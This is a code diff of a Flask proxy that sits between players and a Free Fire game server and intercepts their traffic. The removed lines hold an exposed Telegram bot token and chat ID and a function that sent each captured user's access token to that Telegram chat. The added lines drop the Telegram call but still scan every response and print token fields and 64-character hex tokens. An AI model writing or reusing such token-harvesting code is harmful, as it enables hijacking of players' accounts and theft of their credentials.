@@ -2,31 +2,14 @@ from flask import Flask, request, jsonify, Response
 import requests
 import os
 import re
+import json
 
 app = Flask(__name__)
-
-# ─── CONFIGURATION ──────────────────────────────────────────────
 REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
-TELEGRAM_BOT_TOKEN = os.environ.get('8199355245:AAEXNVzd9lZUv5fvT9axmJ3rNbcSPUh56QA', '')
-TELEGRAM_CHAT_ID = os.environ.get('6261108215', '')
-# ─────────────────────────────────────────────────────────────────
-
-def send_telegram(msg):
-    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        return
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"})
-    except:
-        pass
 
 @app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
 @app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
 def proxy(user_id, subpath):
-    """
-    Forward to REAL_SERVER with the subpath only (strip /user/<user_id>/).
-    """
-    # ── Build real URL – just the subpath ──
     if subpath:
         real_url = f"{REAL_SERVER}/{subpath}"
     else:
@@ -34,10 +17,8 @@ def proxy(user_id, subpath):
 
     print(f"\n🔹 Proxying {request.method} {real_url}")
 
-    # ── Forward request ──
     headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
     headers.pop('Content-Length', None)
-    # Set Host header to the real server's host
     headers['Host'] = REAL_SERVER.replace('https://', '').split('/')[0]
 
     try:
@@ -56,36 +37,24 @@ def proxy(user_id, subpath):
 
     print(f"   Response status: {resp.status_code}")
 
-    # ── Extract hex access token ──
-    hex_token = None
+    # ── Log full response ──
     try:
         data = resp.json()
-        hex_token = data.get('access_token')
-        if hex_token:
-            print(f"✅ HEX ACCESS TOKEN CAPTURED: {hex_token}")
-            send_telegram(
-                f"🎯 <b>Hex Token!</b>\n"
-                f"User: {user_id}\n"
-                f"Token: <code>{hex_token}</code>"
-            )
-        else:
-            print("   No 'access_token' in JSON response.")
+        print(f"   JSON response (first 500 chars):\n{json.dumps(data, indent=2)[:500]}")
+        # Search for any key with 'token' or 'access'
+        for key in data:
+            if 'token' in key.lower() or 'access' in key.lower():
+                print(f"🔑 Found '{key}': {data[key][:40]}...")
     except:
-        raw_body = resp.text
+        raw = resp.text
+        print(f"   Raw response (first 300 chars): {raw[:300]}...")
+        # Also search hex pattern
         hex_pattern = re.compile(r'[0-9a-fA-F]{64}')
-        matches = hex_pattern.findall(raw_body)
+        matches = hex_pattern.findall(raw)
         if matches:
-            hex_token = matches[0]
-            print(f"✅ HEX TOKEN FOUND IN RAW: {hex_token}")
-            send_telegram(
-                f"🎯 <b>Hex Token (raw)</b>\n"
-                f"User: {user_id}\n"
-                f"Token: <code>{hex_token}</code>"
-            )
-        else:
-            print("   No hex token found in response.")
+            print(f"✅ HEX TOKEN FOUND IN RAW: {matches[0]}")
 
-    # ── Return real server response ──
+    # ── Return the real server's response ──
     excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
     response_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded_headers]
 
